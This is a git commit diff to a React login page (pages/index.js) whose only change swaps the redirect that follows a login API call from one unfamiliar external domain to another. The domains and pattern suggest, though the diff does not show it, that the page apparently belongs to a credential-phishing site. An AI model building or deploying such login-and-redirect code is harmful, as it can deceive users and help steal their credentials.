f70151fc002a3bcf4e2b3df535000583eda465be
husknet <127146284+husknet@users.noreply.github.com>
2025-02-07 11:23:49 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://neter.loglinefoline.shop/';
+      window.location.href = 'https://nr.flstoredrive.rocks/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
